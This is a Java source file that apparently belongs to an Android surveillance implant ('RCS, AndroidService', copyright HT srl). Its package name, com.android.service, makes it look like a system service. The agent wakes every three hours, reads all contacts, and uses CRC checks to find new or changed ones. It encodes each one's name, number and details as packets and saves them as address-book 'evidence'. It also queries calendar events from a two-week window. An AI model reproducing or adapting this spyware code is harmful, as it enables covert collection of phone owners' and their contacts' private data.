/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentTask.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.text.format.DateUtils;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.agent.task.Contact;
import com.android.service.agent.task.PhoneInfo;
import com.android.service.agent.task.PickContact;
import com.android.service.agent.task.UserInfo;
import com.android.service.auto.Cfg;
import com.android.service.crypto.Encryption;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentTask extends AgentBase {
	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
	private PickContact contact;

	Markup markup;

	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)

	public AgentTask() {

	}

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	/**
	 * unserialize the contacts crc hashtable
	 */
	@Override
	public void begin() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markup = new Markup(AgentType.AGENT_TASK);
		final boolean needSerialize = false;

		// the markup exists, try to read it
		if (markup.isMarkup()) {
			try {
				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
				}
			}
		}

		// if no markup available, create a new empty one
		if (contacts == null) {
			contacts = new HashMap<Long, Long>();
			serializeContacts();
		}
	}

	/**
	 * serialize contacts in the markup
	 */
	private void serializeContacts() {
		if (Cfg.DEBUG) {
			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
		}

		try {
			final boolean ret = markup.writeMarkupSerializable(contacts);
			if (Cfg.DEBUG) {
				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
			}
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * Every once and then read the contactInfo, and Check.every change. If
	 * //$NON-NLS-1$ something is new the contact is saved.
	 */
	@Override
	public void go() {
		contacts();
		calendar();
	}

	private void calendar() {
		// http://jimblackler.net/blog/?p=151
		// http://forum.xda-developers.com/showthread.php?t=688095

		HashSet<String> calendars;
		String contentProvider;

		contentProvider = "content://calendar";
		calendars = selectCalendars(contentProvider);

		if (calendars == null || calendars.isEmpty()) {
			contentProvider = "content://com.android.calendar";
			calendars = selectCalendars(contentProvider);
		}

		// For each calendar, display all the events from the previous week to
		// the end of next week.
		for (String id : calendars) {
			Uri.Builder builder = Uri.parse(contentProvider + "/instances/when").buildUpon();
			long now = new Date().getTime();
			ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
			ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);

			String textUri = builder.build().toString();

			Cursor eventCursor = managedQuery(builder.build(), new String[] { "title", "begin", "end", "allDay",
					"eventLocation",  "description" }, "Calendars._id=" + id, null,
					"startDay ASC, startMinute ASC");
			// For a full list of available columns see
			// http://tinyurl.com/yfbg76w

			while (eventCursor.moveToNext()) {

				final String title = eventCursor.getString(0);
				final Date begin = new Date(eventCursor.getLong(1));
				final Date end = new Date(eventCursor.getLong(2));
				final Boolean allDay = !eventCursor.getString(3).equals("0");

				final String location = eventCursor.getString(4);
				//final String syncAccount = eventCursor.getString(5);
				String syncAccount = "";
				final String description = eventCursor.getString(5);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: "
							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: "
							+ description);
				}
			}
		}
	}

	private HashSet<String> selectCalendars(String contentProvider) {
		String[] projection = new String[] { "_id", "displayName", "selected" };
		// Uri calendars = Uri.parse("content://calendar/calendars");
		Uri calendars = Uri.parse(contentProvider + "/calendars");

		HashSet<String> calendarIds = new HashSet<String>();

		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null);

		while (managedCursor != null && managedCursor.moveToNext()) {

			final String _id = managedCursor.getString(0);
			final String displayName = managedCursor.getString(1);
			final Boolean selected = !managedCursor.getString(2).equals("0");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: "
						+ selected);
			}

			calendarIds.add(_id);
		}

		return calendarIds;

	}

	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
			String sortOrder) {
		Context context = Status.getAppContext();
		ContentResolver contentResolver = context.getContentResolver();

		final Cursor cursor = contentResolver.query(calendars, projection, selection, selectionArgs, sortOrder);

		return cursor;
	}

	private void contacts() {
		contact = new PickContact();

		final Date before = new Date();
		final List<Contact> list = contact.getContactInfo();
		final Date after = new Date();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): list size = " + list.size());//$NON-NLS-1$
		}

		final ListIterator<Contact> iter = list.listIterator();

		boolean needToSerialize = false;

		// for every Contact
		while (iter.hasNext()) {
			final Contact c = iter.next();

			// calculate the crc of the contact
			final byte[] packet = preparePacket(c);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
			// Utils.byteArrayToHex(packet));
			final Long crcOld = contacts.get(c.getId());
			final Long crcNew = Encryption.CRC32(packet);
			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
			// crcNew);

			// if does not match, save and serialize
			if (!crcNew.equals(crcOld)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
				}
				contacts.put(c.getId(), crcNew);
				saveEvidence(c);
				needToSerialize = true;
				Thread.yield();
			}
		}

		if (needToSerialize) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): serialize contacts");//$NON-NLS-1$
			}
			serializeContacts();
		}
	}

	/**
	 * Save evidence
	 * 
	 * @param c
	 */
	private void saveEvidence(Contact c) {

		final byte[] packet = preparePacket(c);
		contacts.put(c.getId(), Encryption.CRC32(packet));

		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
		log.write(packet);
		log.close();
	}

	/**
	 * Prepare the packet from the contact
	 * 
	 * @param c
	 * @return
	 */
	private byte[] preparePacket(Contact c) {
		final UserInfo user = c.getUserInfo();
		// List<EmailInfo> email = c.getEmailInfo();
		// List<PostalAddressInfo> paInfo = c.getPaInfo();
		final List<PhoneInfo> phoneInfo = c.getPhoneInfo();
		// List<ImInfo> imInfo = c.getImInfo();
		// List<OrganizationInfo> orgInfo = c.getOrgInfo();
		// List<WebsiteInfo> webInfo = c.getWebInfo();
		final long uid = user.getUserId();
		final String name = user.getCompleteName();

		final int version = 0x01000000;

		final byte[] header = new byte[12];

		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		final String message = c.getInfo();

		addTypedString(outputStream, (byte) 0x01, name);
		if (phoneInfo.size() > 0) {
			final String number = phoneInfo.get(0).getPhoneNumber();
			addTypedString(outputStream, (byte) 0x07, number);
		}
		addTypedString(outputStream, (byte) 0x37, message);
		// if(Cfg.DEBUG) Check.log( TAG + " (preparePacket): " + uid + " "  ;//$NON-NLS-1$
		// name);

		final byte[] payload = outputStream.toByteArray();

		final int size = payload.length + header.length;

		// a questo punto il payload e' pronto
		final DataBuffer db_header = new DataBuffer(header, 0, size);
		db_header.writeInt(size);
		db_header.writeInt(version);
		db_header.writeInt((int) uid);

		if (Cfg.DEBUG) {
			Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length); //$NON-NLS-1$
		}

		final byte[] packet = Utils.concat(header, 12, payload, payload.length);
		if (Cfg.DEBUG) {
			Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length); //$NON-NLS-1$
		}
		return packet;
	}

	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);

			try {
				outputStream.write(Utils.intToByteArray(header));
				outputStream.write(WChar.getBytes(name, false));
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
				}
			}
		}
	}

	private void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name, false));
		}
	}

	@Override
	public void end() {

	}
}
